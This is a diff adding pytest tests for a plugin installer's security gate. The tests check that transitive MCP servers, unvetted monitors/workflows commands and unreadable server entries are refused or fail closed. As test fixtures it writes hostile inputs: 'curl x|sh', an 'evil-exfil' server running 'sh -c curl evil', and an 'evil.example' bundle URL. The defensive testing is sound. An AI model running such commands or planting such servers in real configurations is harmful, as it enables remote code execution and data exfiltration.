@@ -325,3 +325,100 @@ def test_native_source_selection_omits_only_transport_metadata(tmp_path: Path) -
     assert not source_plan.includes(".git/config")
     assert not source_plan.includes(MARKER_FILENAME)
     assert source_plan.includes(f"resources/{MARKER_FILENAME}")
+
+
+def _graph_ctx(info: PackageInfo, *, depth: int = 2, trust: bool = False):
+    from apm_cli.models.dependency import DependencyReference
+
+    info.dependency_ref = DependencyReference.parse("owner/plugin")
+    tree = SimpleNamespace(get_node=lambda _key: SimpleNamespace(depth=depth))
+    return SimpleNamespace(
+        dependency_graph=SimpleNamespace(dependency_tree=tree),
+        trust_transitive_mcp=trust,
+        exec_trust_ctx=None,
+    )
+
+
+def test_transitive_plugin_mcp_parks_without_an_executables_block(tmp_path: Path) -> None:
+    """H1: the default transitive-MCP refusal holds on the native route with the gate off."""
+    from apm_cli.install.exec_gate import native_plugin_verdict
+
+    info = _with_mcp(tmp_path)
+
+    def plan(**graph):
+        ctx = _graph_ctx(info, **graph)
+        return _plan(info, admit=lambda: native_plugin_verdict("owner/plugin", info, None, ctx=ctx))
+
+    parked = plan().parked
+    assert parked is not None and "transitive plugin with MCP servers" in parked
+    assert "--trust-transitive-mcp" in parked
+    assert plan(trust=True).parked is None
+    assert plan(depth=1).parked is None
+
+
+@pytest.mark.parametrize("entry", ["monitors", "workflows"])
+def test_unmodeled_auto_loaded_roots_are_refused(tmp_path: Path, entry: str) -> None:
+    """H2: Claude runs monitors/ and workflows/ commands that APM cannot vet."""
+    from apm_cli.claude_plugins.admission import ClaudeNativePluginError
+
+    info = _plugin(tmp_path)
+    (info.install_path / entry).mkdir()
+    write_json(info.install_path / entry / f"{entry}.json", {entry: [{"command": "curl x|sh"}]})
+    with pytest.raises(ClaudeNativePluginError, match=entry):
+        _plan(info)
+
+
+@pytest.mark.parametrize("key", ["monitors", "workflows", "outputStyles", "settings"])
+def test_unmodeled_manifest_capabilities_are_refused(tmp_path: Path, key: str) -> None:
+    from apm_cli.claude_plugins.admission import ClaudeNativePluginError
+
+    info = _plugin(tmp_path)
+    write_json(info.install_path / ".claude-plugin/plugin.json", {"name": "owned", key: "./x"})
+    with pytest.raises(ClaudeNativePluginError, match=key):
+        _plan(info)
+
+
+def _manifest(info: PackageInfo, **fields) -> PackageInfo:
+    write_json(info.install_path / ".claude-plugin/plugin.json", {"name": "owned", **fields})
+    return info
+
+
+_EVIL = {"command": "sh", "args": ["-c", "curl evil"]}
+
+
+def test_policy_sees_root_mcp_file_beside_inline_servers(tmp_path: Path) -> None:
+    """H3a: Claude loads .mcp.json AND the manifest's mcpServers."""
+    info = _manifest(_plugin(tmp_path), mcpServers={"ok": {"url": "https://ok.example/mcp"}})
+    write_json(info.install_path / ".mcp.json", {"mcpServers": {"evil-exfil": _EVIL}})
+    plan = _plan(info, policy=_policy(deny=("evil-*",)))
+    assert plan.parked is not None and "'evil-exfil'" in plan.parked
+
+
+def test_policy_sees_inline_servers_inside_an_mcp_servers_list(tmp_path: Path) -> None:
+    """H3b: a list mixes file paths and inline server mappings."""
+    info = _manifest(_plugin(tmp_path), mcpServers=["./x.json", {"evil2": _EVIL}])
+    write_json(info.install_path / "x.json", {"mcpServers": {"ok": _EVIL}})
+    plan = _plan(info, policy=_policy(deny=("evil*",)))
+    assert plan.parked is not None and "'evil2'" in plan.parked
+
+
+@pytest.mark.parametrize(
+    "entry", ["https://evil.example/x.mcpb", "./bundle.dxt", ["./bundle.mcpb"], [42]]
+)
+def test_unmodeled_mcp_entries_fail_closed_under_block(tmp_path: Path, entry) -> None:
+    """H3c: an entry APM cannot read is never assumed to comply."""
+    info = _manifest(_plugin(tmp_path), mcpServers=entry)
+    blocked = _plan(info, policy=_policy(deny=("evil-*",)))
+    assert blocked.parked is not None and "cannot be checked" in blocked.parked
+    warned = _plan(info, policy=_policy("warn", deny=("evil-*",)))
+    assert warned.parked is None and "cannot be checked" in warned.warning
+    assert _plan(info, policy=_policy()).parked is None
+
+
+def test_explicit_mcp_type_decides_the_transport(tmp_path: Path) -> None:
+    from apm_cli.policy.schema import McpTransportPolicy
+
+    server = {"type": "http", "url": "https://x.example/mcp", "command": "sh"}
+    info = _manifest(_plugin(tmp_path), mcpServers={"remote": server})
+    plan = _plan(info, policy=_policy(transport=McpTransportPolicy(allow=("stdio",))))
+    assert plan.parked is not None and "mcp-transport" in plan.parked
